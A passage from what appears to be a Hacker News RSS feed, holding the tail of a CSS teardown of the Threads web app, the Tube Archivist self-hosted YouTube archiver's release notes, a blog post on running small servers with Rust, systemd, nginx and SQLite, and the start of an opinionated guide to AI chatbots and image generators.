        <figcaption></figcaption>
    
</figure>

<p>The length of the first part is calculated with JavaScript.</p>

<h2 id="inline-css-variables-for-css-grid">Inline CSS variables for CSS grid</h2>

<p>I’m happy to see a thing that I and many others <a href="https://ishadeed.com/article/css-variables-inline-styles/">advocated for</a> is being used on a large-scale app like Threads.</p>

<p>In the user profile, the tabs grid layout is built with an inline CSS variable that includes the count of the tabs.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-inline-css-vars.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>This is useful. When the number of tabs increased, we only need to change the value of the CSS variable. Neat, right?</p>

<h2 id="overflow-wrapping">Overflow wrapping</h2>

<p>I noticed the use of <code>overflow-wrap: anywhere</code> for the post body. I haven’t used or heard of that keyword before. I use <code>break-word</code>.</p>

<p>As per <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/overflow-wrap">MDN</a>, it’s the same as <code>break-word</code> but with one additional thing:</p>

<blockquote>
  <p>Soft wrap opportunities introduced by the word break are considered when calculating min-content intrinsic sizes.</p>
</blockquote>

<p>I still didn’t find a difference when using <code>break-word</code> vs <code>anywhere</code>. I’m very curious to know why, if any of the Threads team is reading this.</p>

<h2 id="the-use-of-dynamic-viewport-units">The use of dynamic viewport units</h2>

<p>I like the use of the dynamic viewport unit <code>dvh</code> for the splash screen.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-splash-dvh.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>If you want to learn more, I wrote a detailed article on <a href="https://ishadeed.com/article/new-viewport-units/">the new viewport units</a>.</p>

<h2 id="defensive-css-strategies">Defensive CSS strategies</h2>

<p>To make sure that a flexbox layout won’t break because of the minimum content length, <code>min-width: 0</code> is used to reset that behavior.</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-splash-min-width.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<p>Read more about this in my <a href="https://defensivecss.dev/tip/flexbox-min-content-size/">defensive CSS post</a> about the minimum content size in flexbox.</p>

<h2 id="conclusion">Conclusion</h2>

<p>That’s it for today. I enjoyed inspecting the CSS and getting to know how the Threads team is building the product. I’m sure there are a lot of things that I haven’t noticed because this is the preview-only version on the web.</p>

	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Self hosted YouTube media server (126 pts)]]></title>
            <link>https://www.tubearchivist.com/</link>
            <guid>36744395</guid>
            <pubDate>Sun, 16 Jul 2023 07:13:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tubearchivist.com/">https://www.tubearchivist.com/</a>, See on <a href="https://news.ycombinator.com/item?id=36744395">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

<p>
<h2>Your self hosted YouTube media server</h2>
</p>

<p><a href="https://www.tilefy.me/" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-github-star.png" alt="tubearchivist-github-star" title="Tube Archivist GitHub Stars"></a>
<a href="https://www.tilefy.me/" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-docker.png" alt="tubearchivist-docker" title="Tube Archivist Docker Pulls"></a>
<a href="https://www.tilefy.me/" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-github-forks.png" alt="tubearchivist-docker" title="Tube Archivist Docker Pulls"></a>
<a href="https://www.tubearchivist.com/discord" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-discord.png" alt="tubearchivist-discord" title="TA Discord Server Members"></a>
</p>
<p>
<h2>Browser Extension: Tube Archivist Companion</h2>
</p>

<p><a href="https://www.tilefy.me/" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-chrome.png" alt="tubearchivist-chrome" title="TA Companion Chrome users"></a>
<a href="https://www.tilefy.me/" target="_blank"><img src="https://tiles.tilefy.me/t/tubearchivist-firefox.png" alt="tubearchivist-firefox" title="TA Companion Firefox users"></a>
</p>
<div data-embed="O8H8Z01c0Ys">
<p><img src="https://www.tubearchivist.com/static/img/icon-play.svg" alt="play">
</p>
</div>
<div>
<div>
<h2>Core functionality</h2>
<ul>
<li>Subscribe to your favorite YouTube channels</li>
<li>Download Videos</li>
<li>Index and make videos searchable</li>
<li>Play videos</li>
<li>Keep track of viewed and unviewed videos</li>
</ul>
</div>
<div>
<h2>Problem Description</h2>
<p>Once your YouTube video collection grows, it becomes hard to search and find a specific video. That's where Tube Archivist comes in: By indexing your video collection with metadata from YouTube, you can organize, search and enjoy your archived YouTube videos without hassle offline through a convenient web interface.
</p>
</div>
</div>
<div>
<h2>Latest Release:</h2>
<p>Release tag: v0.3.6</p>
<p>Release date: 2023-05-13</p>
<div>
<h2>Project Updates</h2>
<ul>
<li>This update will automatically change and rebuild the video, channel and download queue indexes.</li>
<li>Tube Archivist Companion browser extension also got an update to control auto start behavior: <a href="https://github.com/tubearchivist/browser-extension/releases/tag/v0.1.4">Release Notes</a></li>
<li>If you are a sponsor, the real time monitor client also got an update to control auto start behavior: <a href="https://github.com/tubearchivist/members/releases/tag/v0.0.2">Release Notes</a></li>
<li>At first start, there is a migration command running to index additional metadata from your media files. That includes file size, codec, bitrate, resolution. To improve reliability of that process, this first triggers a <a href="https://docs.tubearchivist.com/settings/#rescan-filesystem">Rescan Filesystem</a> command to validate all media file paths. Make sure you have all media files mounted before updating.</li>
<li>That process can take some time, depending on various factors, expect this to take around 1 minute per 1000 videos.</li>
<li>Log output will show progress and any error messages.</li>
<li>The interface will become available again, after that completes.</li>
<li>Be patient and grab some popcorn to watch the logs fly by.</li>
</ul>
<h2>Added</h2>
<ul>
<li>Added video stream metadata indexing like codecs, bitrate, filesize</li>
<li>Added channel metadata aggregation like total file size, total videos, total playback.</li>
<li>Added start now for adding to download queue, <a href="https://docs.tubearchivist.com/downloads/#add-to-download-queue">docs</a></li>
<li>Added auto start for subscriptions, <a href="https://docs.tubearchivist.com/settings/#subscriptions">docs</a></li>
<li>Added extractor language configuration, <a href="https://docs.tubearchivist.com/settings/#download-format">docs</a></li>
<li>Added <code>--format-sort</code> configuration, <a href="https://docs.tubearchivist.com/settings/#download-format">docs</a>, by @dsander</li>
<li>Added channel tags indexing for better search results</li>
<li>[API] Added endpoints to control auto start behavior</li>
</ul>
<h2>Changed</h2>
<ul>
<li>Changed channel metadata extraction to use <code>yt-dlp</code> instead of custom scraper for better reliability.</li>
<li>Removed the <code>limit_count</code> config field, use queue control instead</li>
</ul>
<h2>Fixed</h2>
<ul>
<li>Fixed backup run issue when not initiated with task</li>
<li>Fixed playlist ID parser for members only playlists, by @mglinski</li>
</ul>
</div>
</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How I run my servers (2022) (229 pts)]]></title>
            <link>https://blog.wesleyac.com/posts/how-i-run-my-servers</link>
            <guid>36744090</guid>
            <pubDate>Sun, 16 Jul 2023 05:56:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.wesleyac.com/posts/how-i-run-my-servers">https://blog.wesleyac.com/posts/how-i-run-my-servers</a>, See on <a href="https://news.ycombinator.com/item?id=36744090">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <p>I've been writing recently about servers and internet infrastructure<sup id="fnref1"><a href="#fn1">1</a></sup>. A lot of this writing is predicated on running server software on a VM or physical machine, rather than using a more cloudy solution, which is somewhat unpopular these days. However, I think it's a pretty reasonable way to do things, and it's not as difficult as many people make it out to be. This post is a simple description of how I run most of the servers I operate. It mostly describes running server software that I've written myself, since that allows me to make it much more robust and easy to deploy than the vast majority of off-the-shelf software is.</p>

<p>This describes roughly the setup for <a href="https://thoughts.page/">thoughts.page</a>, <a href="https://hanabi.site/">hanabi.site</a>, <a href="https://github.com/WesleyAC/cgmserver">cgmserver</a>, <a href="https://github.com/WesleyAC/phonebridge">phonebridge</a>, and a few other services.</p>

<p>These apps run on DigitalOcean VMs — the $5/month tier. (Some of them are on the same VM, some on different VMs — more on that later). The VMs run Debian 10.</p>

<p>The server software is written in Rust. It's statically linked, and all of the html, css, config, secrets, etc are compiled into the binary. I accomplish this with <a href="https://github.com/emk/rust-musl-builder">rust-musl-builder</a> and <a href="https://github.com/pyros2097/rust-embed">rust-embed</a>. This means that deployment only requires copying a single file to the server. You can do similar things in languages like Go, C++, etc, and probably others, although I don't know the details of how exactly to accomplish it in those languages. If you're using a language that doesn't let you do this easily, a good alternative would be building a Docker container as your build artifact, which similarly will give you a single file to deploy.</p>

<p>I use systemd to ensure that the binary starts when the server is started. Most of my systemd unit files are <a href="https://gist.github.com/WesleyAC/b3aaa0292579158ad566c140415c875d#file-example-service">9 lines long and extremely simple</a>. systemd itself is quite complicated, but just starting a server on boot does not expose you to most of that complexity.</p>

<p>I use a <a href="https://blog.wesleyac.com/posts/simple-deploy-script">simple deploy script</a> that copies the binary to the server and restarts the server, taking a little bit of care to allow rollbacks and ensure that there will always be a valid version running, even if my connection drops while I'm deploying.</p>

<p>Programs that require a database use <a href="https://blog.wesleyac.com/posts/consider-sqlite">SQLite</a>, which means that the entire state of the app is kept in a single file. I have two redundant backup solutions: On a daily basis, a backup is taken via the <a href="https://sqlite.org/cli.html">SQLite <code>.backup</code> command</a>, and saved to <a href="https://www.tarsnap.com/">Tarsnap</a>. The script to do so is run via <a href="https://en.wikipedia.org/wiki/Cron">cron</a>. I also use <a href="https://litestream.io/">Litestream</a> to stream a copy of the database to DigitalOcean Spaces storage on a secondly basis, with snapshots taken every 6 hours. This gives me quite a lot of confidence that even in the most disastrous of cases, I'm unlikely to lose a significant amount of data, and if I wanted to be more sure, I could crank up the frequency of the Tarsnap backups.</p>

<p>All of my servers run behind <a href="https://nginx.org/">nginx</a> running as a reverse proxy. The main advantage to this is that nginx can do TLS termination, which means my apps don't need to think about HTTPS at all. I get my HTTPS certs from <a href="https://letsencrypt.org/">Let's Encrypt</a> via <a href="https://certbot.eff.org/">certbot</a> — this handles automatic renewal so I don't have to do anything to keep it working. <a href="https://gist.github.com/WesleyAC/a9b4d6079854a6617f9fe6be96beddfa">Here's</a> what my nginx config for <a href="https://hanabi.site/">hanabi.site</a> looks like. Nginx also works great for serving static files — you can just <code>scp</code> or <code>rsync</code> them from your computer to the server.</p>

<p>This is a simple and extremely robust setup. All of the software on the serving path (except for the apps themselves) has been around for decades and is extremely battle-tested. There is essentially no maintenance involved in keeping a site like this running — as long as I keep paying my DigitalOcean bills, they'll keep going. The only times my monitoring has detected problems with these sites have been transient DigitalOcean networking issues. I do need to update things occasionally — Debian releases have 5 years of support, so I'll need to upgrade to Debian 11 in around two and a half years, and if (when) something like <a href="https://en.wikipedia.org/wiki/Heartbleed">heartbleed</a> happens again, I'll need to go patch it. However, events like that are quite rare.</p>

<p>One complaint about this setup is that paying $5/month for every service you want to run is a lot. This is indeed annoying, but it's quite doable to run multiple services on the same VM. In order to provide isolation, I run each service as its own unix user account. This form of isolation has been around since the dawn of unix, and thus seems quite robust. If you want more isolation, you can also use <a href="https://www.freedesktop.org/software/systemd/man/systemd-nspawn.html">systemd-nspawn</a> or <a href="https://firejail.wordpress.com/">firejail</a>. I usually don't bother, though — if something is really important to keep secure, I'll just pay the extra $5/month to run it on its own VM.</p>

<p>So, the process for setting up a new project looks like:</p>

<ul>
<li>Create a new user</li>
<li>Add a new nginx virtual host (and run certbot to get a HTTPS cert)</li>
<li>Add a systemd unit</li>
<li>Commit a <a href="https://blog.wesleyac.com/posts/simple-deploy-script">deploy script</a> to the repository and run it</li>
</ul>

<p>This can be a lot to figure out if you haven't done it before! However, one of the advantages to running things this way is that this infrastructure changes much, much more slowly than cloud infrastructure does. You only need to learn how to set up nginx once, since the config format has stayed essentially the same for the past decade<sup id="fnref2"><a href="#fn2">2</a></sup>, and is likely to remain the same in the future. The last major change to Debian system administration was the switch to systemd, nearly a decade ago. One of the comforts of running things this way is that you know that no one is going to pull the rug out from under you — no cloud provider is going to deprecate the service you're using, or silently change how it works. The only dependency is your VPS provider, and if you're unhappy with them — well, servers are a commodity, and there are a thousand other providers out there.</p>

<p><strong>Thanks to Julia Evans for prodding me to finally write this, and for early feedback.</strong></p>



      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to Use AI to Do Stuff: An Opinionated Guide (190 pts)]]></title>
            <link>https://www.oneusefulthing.org/p/how-to-use-ai-to-do-stuff-an-opinionated</link>
            <guid>36743784</guid>
            <pubDate>Sun, 16 Jul 2023 04:51:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.oneusefulthing.org/p/how-to-use-ai-to-do-stuff-an-opinionated">https://www.oneusefulthing.org/p/how-to-use-ai-to-do-stuff-an-opinionated</a>, See on <a href="https://news.ycombinator.com/item?id=36743784">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p><span>Increasingly powerful AI systems are being released at an increasingly rapid pace. This week saw the debut of Claude 2, likely the second most capable AI system available to the public. The week before, Open AI released Code Interpreter, the most sophisticated mode of AI yet available. The week before that, some AIs </span><a href="https://www.oneusefulthing.org/p/on-giving-ai-eyes-and-ears" rel="">got the ability to see images</a><span>.</span></p><p>And yet not a single AI lab seems to have provided any user documentation. Instead, the only user guides out there appear to be Twitter influencer threads. Documentation-by-rumor is a weird choice for organizations claiming to be concerned about proper use of their technologies, but here we are.</p><p>I can’t claim that this is going to be a complete user guide, but it will serve as a bit of orientation to the current state of AI. I have been putting together a Getting Started Guide to AI for my students (and interested readers) every few months, and each time, it requires major modifications. The last couple of months have been particularly insane.</p><p><span>This guide is opinionated, based on my experience, and focused on how to pick the right tool to do things. I have written separately about </span><a href="https://www.oneusefulthing.org/p/on-boarding-your-ai-intern" rel="">the kinds of tasks you may want AI to do</a><span>, which might be useful to read first.</span></p><p><span>When we talk about AI right now, we are usually talking about Large Language Models, or LLMs. Most AI applications are powered by LLMs, of which there are just a few Foundation Models, created by a handful of organizations. Each company gives direct access to their models via a Chatbot: OpenAI makes GPT-3.5 and GPT-4, which power </span><a href="https://chat.openai.com/" rel="">ChatGPT </a><span>and Microsoft’s </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx&amp;sydconv=1" rel="">Bing </a><span>(access it on an Edge browser). Google has a variety of models under the label of </span><a href="https://bard.google.com/" rel="">Bard</a><span>. And Anthropic makes Claude and </span><a href="https://claude.ai/" rel="">Claude 2</a><span>. </span></p><p><span>There are other LLMs I won’t be discussing. The first is </span><a href="https://pi.ai/talk" rel="">Pi</a><span>, a chatbot built by Inflection. Pi is optimized for conversation, and really, really wants to be your friend (seriously, try it to see what I mean). It does not like to do much besides chat, and trying to get it to do work for you is an exercise in frustration. We also won’t cover the variety of open source models that anyone can use and modify. They are generally not accessible or useful for the casual user today, but have real promise. Future guides may include them.</span></p><p>So here is your quick reference chart, summarizing the state of LLMs:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png" width="1456" height="848" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:848,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:388305,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F158ee53f-0551-4381-988d-20f2d9b7adb2_2006x1169.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>The first four (including Bing) are all OpenAI systems. There are basically two major OpenAI AIs today: 3.5 and 4. The 3.5 model kicked off the current AI craze in November, the 4 model premiered in the Spring and is much more powerful. A new variation uses plugins to connect to the internet and other apps. There are a lot of plugins, most of which are not very useful, but you should feel free to explore them as needed. Code Interpreter as is an extremely powerful version of ChatGPT that can run Python programs. If you have never paid for OpenAI, you have only used 3.5. Aside from the plugins variation, and a temporarily suspended version of GPT-4 with browsing, none of these models are connected to the internet. Microsoft’s Bing uses a mix of 4 and 3.5, and is usually the first model in the GPT-4 family to roll out new features. For example, it can both create and view images, and it can read documents in the web browser. It is connected to the internet. </span><a href="https://oneusefulthing.substack.com/p/power-and-weirdness-how-to-use-bing" rel="">Bing is a bit weird to use, but powerful. </a></p><p>Google has been testing its own AI for consumer use, which they call Bard, but which is powered by a variety of Foundation Models, most recently one called PaLM 2. For the company that developed LLM technology, they have been pretty disappointing, although improvements announced yesterday show they are still working on the underlying technology, so I have hope. It has already gained the capability to run limited code and interpret images, but I would generally avoid it for now.</p><p>The final company, Anthropic has released Claude 2. Claude is most notable for having a very large context window - essentially the memory of the LLM. Claude can hold almost an entire book, or many PDFs,  in memory. It has been built to be less likely to act maliciously than other Large Language Models, which means, practically, that it tends to scold you a bit about stuff.</p><p>Now, on to some uses:</p><p><strong>Best free options:</strong><span> </span><a href="https://www.bing.com/search?q=Bing+AI&amp;showconv=1&amp;FORM=hpcodx" rel="">Bing </a><span>and </span><a href="https://claude.ai/" rel="">Claude 2</a><br><strong>Paid option: </strong><a href="https://chat.openai.com/chat" rel="">ChatGPT</a><span> 4.0/ChatGPT with plugins</span></p><p>For right now, GPT-4 is still the most capable AI tool for writing, which you can access at Bing (select“creative mode”) for free or by purchasing a $20/month subscription to ChatGPT. Claude, however, is a close second, and has a limited free option available.</p><p><span>These tools are also being integrated directly into common office applications. Microsoft Office will include a copilot powered by GPT and Google Docs will integrate suggestions from Bard. </span><a href="https://www.oneusefulthing.org/p/setting-time-on-fire-and-the-temptation" rel="">The implications of what these new innovations mean for writing are pretty profound.</a></p><p>Here are some ways to use AI to help you write.</p><ul><li><p><span>Writing drafts of anything. Blog posts, essays, promotional material, speeches, lectures, chose-you-own adventures, scripts, short stories - you name it, AI does it, and pretty well. All you have to do is prompt it. Prompt crafting is not magic, but basic prompts result in boring writing, </span><a href="https://www.oneusefulthing.org/p/on-boarding-your-ai-intern" rel="">but getting better at prompting is not that hard, just work interactively with the system.</a><span> You will find AI systems to be much more capable as writers with a little practice.</span></p></li><li><p>Make your writing better. Paste your text into an AI. Ask it to improve the content, or for suggestions about how to make it better for a particular audience. Ask it to create 10 drafts in radically different styles. Ask it to make things more vivid, or add examples. Use it to inspire you to do better work.</p></li><li><p><span>Help you with tasks. AI can do things you don’t have the time to do. Use it like an intern to write emails, create sales templates, give you next steps in a business plan, and a lot more. </span><a href="https://oneusefulthing.substack.com/p/superhuman-what-can-ai-do-in-30-minutes" rel="">Here is what I could accomplish with it in 30 minutes in supporting a product launch.</a></p></li><li><p><a href="https://oneusefulthing.substack.com/p/how-to-use-ai-to-unstick-yourself" rel="">Unblock yourself.</a><span> It is very easy to get distracted from a task by one difficult challenge. AI provides a way of giving yourself momentum.</span></p></li></ul><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png" width="1456" height="878" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:878,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:904863,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66591236-914c-4842-82a6-e79cbeac1e5d_2175x1312.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><em>Some things to worry about: </em><span>In a bid to respond to your answers, it is very easy for the AI to “hallucinate” and generate plausible facts. It can generate entirely false content that is utterly convincing. Let me emphasize that: </span><em><strong>AI lies continuously and well</strong></em><span>. Every fact or piece of information it tells you may be incorrect. You will need to check it all. Particularly dangerous is asking it for references, quotes, citations, and information for the internet (for the models that are not connected to the internet). Bing will usually hallucinate less than other models, because GPT-4 is generally more grounded and because Bing’s internet connection means it can actually pull in relevant facts. </span><a href="https://oneusefulthing.substack.com/p/how-to-get-an-ai-to-lie-to-you-in" rel="">Here is a guide to avoiding hallucinations</a><span>, but they are impossible to completely eliminate.</span></p><p>And also note that AI doesn’t explain itself, it only makes you think it does. If you ask it to explain why it wrote something, it will give you a plausible answer that is completely made up. When you ask it for its thought process, is not interrogating its own actions, it is just generating text that sounds like it is doing so. This makes understanding biases in the system very challenging, even though those biases almost certainly exist.</p><p>It also can be used unethically to manipulate or cheat. You are responsible for the output of these tools.</p><ol><li><p><span>Stable Diffusion, which is open source and you can run from any high-end computer. It takes effort to get started, since you have to learn to craft prompts properly, but once you do it can produce great results. It is especially good for combining AI with images from other sources. </span><a href="https://www.jonstokes.com/p/stable-diffusion-20-and-21-an-overview" rel="">Here is a nice guide to Stable Diffusion if you go that route (be sure to read both parts 1 and part 2).</a></p></li><li><p>DALL-E, from OpenAI, which is incorporated into Bing (you have to use creative mode) and Bing image creator. This system is solid, but worse than Midjourney.</p></li><li><p><span>Midjourney, which is the best system in mid-2023. It has the lowest learning-curve of any system: just type in "thing-you-want-to-see --v 5.2" (the --v 5.2 at the end is important, it uses the latest model) and you get a great result. Midjourney requires Discord.</span><a href="https://www.pcworld.com/article/540080/how-to-use-discord-a-beginners-guide.html" rel=""> Here is a guide to </a><span>using Discord.</span></p></li><li><p>Adobe Firefly, built into a variety of Adobe products, but it lags DALL-E and Midjourney in terms of quality. However, while the other two models have been unclear about the source images that they used to train their AIs, Adobe has declared that it is only using images it has the right to use.</p></li></ol><p>Here is how they compare (each image is labelled with the model):</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png" width="658" height="658.4519230769231" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png&quot;,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1457,&quot;width&quot;:1456,&quot;resizeWidth&quot;:658,&quot;bytes&quot;:7140129,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0f85b2f7-8586-4d2a-ad73-64a9e6fad8b1_2062x2063.png 848w, 